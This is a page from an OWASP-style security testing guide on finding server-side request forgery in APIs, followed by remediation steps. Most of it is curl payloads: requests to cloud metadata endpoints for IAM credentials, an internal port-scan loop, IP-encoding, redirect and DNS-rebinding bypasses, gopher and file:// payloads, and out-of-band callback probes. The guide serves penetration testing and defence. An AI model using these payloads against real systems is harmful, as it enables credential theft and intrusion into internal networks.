# Testing API Server Side Request Forgery

|ID          |
|------------|
|WSTG-APIT-08|

## Summary

Server Side Request Forgery (SSRF) in APIs occurs when the server
fetches a URL or network resource specified (directly or indirectly)
by client input without properly validating the destination. APIs are
especially exposed because they commonly accept URL parameters for
webhooks, callbacks, file imports, avatar uploads, PDF generation,
link previews, and OAuth redirect flows.

A successful SSRF attack can allow an attacker to:

- Access internal services not reachable from the internet (databases,
  admin panels, internal APIs).
- Read cloud provider metadata endpoints to harvest credentials.
- Scan the internal network to map live hosts and open ports.
- Bypass firewalls, VPNs, and access control lists.
- Exfiltrate data through an outbound request to an attacker-
  controlled server.

Blind SSRF (where the response is not returned to the attacker) is
common in API contexts and requires out-of-band techniques for
detection.

## Test Objectives

- Identify API parameters that accept URLs, hostnames, IP addresses,
  or file paths that the server fetches.
- Determine whether the API resolves and requests attacker-supplied
  internal or metadata URLs.
- Verify whether URL validation can be bypassed through encoding,
  redirect chains, DNS rebinding, or protocol switching.
- Detect blind SSRF through out-of-band callbacks.

## How to Test

### Identify SSRF-Susceptible Parameters

Review the API documentation and observed traffic for parameters that
accept URLs. Common parameter names and contexts include:

- `url`, `uri`, `href`, `link`, `src`, `source`
- `callback`, `callbackUrl`, `webhook`, `webhookUrl`
- `redirect`, `redirectUrl`, `return`, `returnUrl`
- `imageUrl`, `avatarUrl`, `iconUrl`, `logoUrl`
- `importUrl`, `feedUrl`, `rssUrl`, `xmlUrl`
- `templateUrl`, `previewUrl`, `proxyUrl`
- `pdfUrl`, `reportUrl`, `exportUrl`

Also look for endpoints that accept a hostname or IP as a separate
parameter:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"host":"internal.example.com","port":8080}' \
  https://api.example.com/v1/connections/test
```

### Test Basic Internal URL Access

Replace a URL parameter value with an internal address and observe the
response:

```bash
# Original request
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"webhookUrl":"https://attacker.example.com/hook"}' \
  https://api.example.com/v1/webhooks

# Target localhost
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"webhookUrl":"http://127.0.0.1:8080/admin"}' \
  https://api.example.com/v1/webhooks

# Target internal hostname
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"webhookUrl":"http://internal-api.local:3000/status"}' \
  https://api.example.com/v1/webhooks
```

If the response contains content from the internal service (HTML, JSON
status data, error messages that differ from the public error page),
the endpoint is vulnerable.

### Test Cloud Metadata Endpoint Access

Cloud providers expose instance metadata at well-known addresses.
Attempt to reach them through the vulnerable parameter:

```bash
# AWS IMDSv1
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  https://api.example.com/v1/fetch

# AWS IMDSv2 (requires a token header the server may not set)
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  https://api.example.com/v1/fetch

# GCP metadata
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/"}' \
  https://api.example.com/v1/fetch

# Azure metadata
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01"}' \
  https://api.example.com/v1/fetch

# DigitalOcean metadata
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"http://169.254.169.254/metadata/v1/"}' \
  https://api.example.com/v1/fetch
```

A response containing instance metadata, IAM role names, or temporary
credentials confirms the vulnerability.

### Test Internal Network Scanning

Use the SSRF to probe internal network addresses and map open ports:

```bash
# Scan common internal addresses
for ip in 127.0.0.1 10.0.0.1 172.16.0.1 192.168.1.1; do
  for port in 80 443 8080 8443 3000 5000 6379 27017 3306 5432; do
    START=$(date +%s%N)
    curl -s -o /dev/null -w "%{http_code}" -m 3 \
      -X POST -H "Content-Type: application/json" \
      -H "Authorization: Bearer <TOKEN>" \
      -d "{\"url\":\"http://$ip:$port/\"}" \
      https://api.example.com/v1/fetch
    END=$(date +%s%N)
    ELAPSED=$(( (END - START) / 1000000 ))
    echo " $ip:$port ${ELAPSED}ms"
  done
done
```

Different response times and status codes reveal whether the port is
open (fast response or different error), closed (connection refused,
fast), or filtered (timeout).

### Bypass URL Validation with IP Address Encoding

If the API blocks `127.0.0.1` or `169.254.169.254` by string match,
use alternative IP representations:

```bash
# Decimal encoding
curl -s -d '{"url":"http://2130706433/admin"}' ...
# 2130706433 = 127.0.0.1 in decimal

# Hexadecimal
curl -s -d '{"url":"http://0x7f000001/admin"}' ...

# Octal
curl -s -d '{"url":"http://0177.0.0.1/admin"}' ...

# IPv6 loopback
curl -s -d '{"url":"http://[::1]/admin"}' ...

# IPv6-mapped IPv4
curl -s -d '{"url":"http://[::ffff:127.0.0.1]/admin"}' ...

# Dotted hex
curl -s -d '{"url":"http://0x7f.0x0.0x0.0x1/admin"}' ...

# Mixed encoding
curl -s -d '{"url":"http://127.1/admin"}' ...

# Zero-prefixed
curl -s -d '{"url":"http://0127.0.0.1/admin"}' ...

# Decimal for metadata
curl -s -d '{"url":"http://2852039166/latest/meta-data/"}' ...
# 2852039166 = 169.254.169.254 in decimal
```

### Bypass URL Validation with URL Encoding

```bash
# Single URL encoding
curl -s -d '{"url":"http://%31%32%37%2e%30%2e%30%2e%31/admin"}' ...

# Double URL encoding
curl -s -d '{"url":"http://%25%33%31%25%33%32%25%33%37%2e%30%2e%30%2e%31/admin"}' ...

# Unicode encoding
curl -s -d '{"url":"http://①②⑦.⓪.⓪.①/admin"}' ...
```

### Bypass with DNS Rebinding

Register a DNS name that alternates between a public IP and an
internal IP. On the first lookup the server sees the public IP and
allows it. On the second lookup (during the actual fetch), the DNS
resolves to the internal address.

Services such as `rebind.it` and `1u.ms` provide lab-safe DNS
rebinding setups. Configure the domain to return `127.0.0.1` on every
other query:

```bash
curl -s -d '{"url":"http://make-127-0-0-1-rr.1u.ms/admin"}' ...
```

### Bypass with Open Redirect Chains

If the target API follows HTTP redirects, find an open redirect on an
allowed domain and chain it to an internal URL:

```bash
# Step 1: Identify an open redirect on an allowed domain
# https://allowed.example.com/redirect?url=http://127.0.0.1:8080

# Step 2: Use it as the SSRF payload
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"url":"https://allowed.example.com/redirect?url=http://127.0.0.1:8080/admin"}' \
  https://api.example.com/v1/fetch
```

The server validates the initial URL against its allowlist, follows
the redirect, and reaches the internal address.

### Bypass with Protocol Switching

If the URL validation only checks the `http://` or `https://` scheme,
test other protocols:

```bash
# File protocol
curl -s -d '{"url":"file:///etc/passwd"}' ...

# Gopher protocol (if supported by the HTTP library)
curl -s -d '{"url":"gopher://127.0.0.1:6379/_INFO"}' ...

# Dict protocol
curl -s -d '{"url":"dict://127.0.0.1:6379/INFO"}' ...

# FTP protocol
curl -s -d '{"url":"ftp://127.0.0.1/etc/passwd"}' ...
```

The `gopher://` protocol is especially dangerous because it allows
sending arbitrary TCP data to internal services such as Redis,
Memcached, or SMTP.

### Detect Blind SSRF with Out-of-Band Callbacks

When the server does not return the response body, use an out-of-band
channel to confirm the server made the request:

```bash
# Use a callback service to receive the request
# Replace <CALLBACK_ID> with your unique identifier
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"webhookUrl":"https://<CALLBACK_ID>.oastify.com"}' \
  https://api.example.com/v1/webhooks
```

Check the callback service for an incoming HTTP request from the
target server's IP address. If a request arrives, the server followed
the URL.

For DNS-only detection:

```bash
curl -s -d '{"url":"http://ssrf-test.<CALLBACK_ID>.oastify.com"}' ...
```

A DNS query for the subdomain confirms the server resolved the
hostname, even if the HTTP request was blocked by a firewall.

### Test SSRF in PDF and Image Generation

APIs that generate PDFs, screenshots, or thumbnails from user-supplied
content or URLs are a common SSRF vector:

```bash
# PDF generation endpoint
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"htmlContent":"<iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe>"}' \
  https://api.example.com/v1/export/pdf -o response.pdf

# Screenshot endpoint
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"screenshotUrl":"http://127.0.0.1:8080/admin"}' \
  https://api.example.com/v1/screenshots
```

Open the generated PDF and check whether it contains rendered content
from the internal service.

### Test SSRF in OAuth and SAML Flows

OAuth callback URLs and SAML assertion consumer service URLs may be
used as SSRF vectors if the server validates and fetches them:

```bash
# OAuth: manipulate the redirect_uri
curl -s "https://api.example.com/oauth/authorize?\
client_id=<CLIENT>&\
redirect_uri=http://127.0.0.1:8080/capture&\
response_type=code&\
scope=read"

# SAML: manipulate the assertion consumer service URL in metadata
# (requires crafting or modifying a SAML metadata XML document)
```

## Remediation

- Validate and sanitize all user-supplied URLs on the server side
  before fetching them.
- Use an allowlist of permitted schemes (`https` only when possible),
  hostnames, and ports.
- Resolve the hostname to an IP address and verify that it is not a
  private, loopback, link-local, or metadata address before making the
  request.
- Disable HTTP redirect following, or re-validate the destination
  after each redirect.
- Enforce a response size limit and a timeout on outbound requests.
- Run the fetching service in a network segment with no access to
  internal services or metadata endpoints.
- For cloud deployments, enforce IMDSv2 (which requires a PUT-based
  token request that most SSRF payloads cannot perform).
- See the [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## References

- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [CWE-441: Unintended Proxy or Intermediary (Confused Deputy)](https://cwe.mitre.org/data/definitions/441.html)
- [OWASP API Security Top 10 — API7:2023 Server Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide — Testing for SSRF (WSTG-INPV-19)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)
- [PortSwigger SSRF Research](https://portswigger.net/web-security/ssrf)
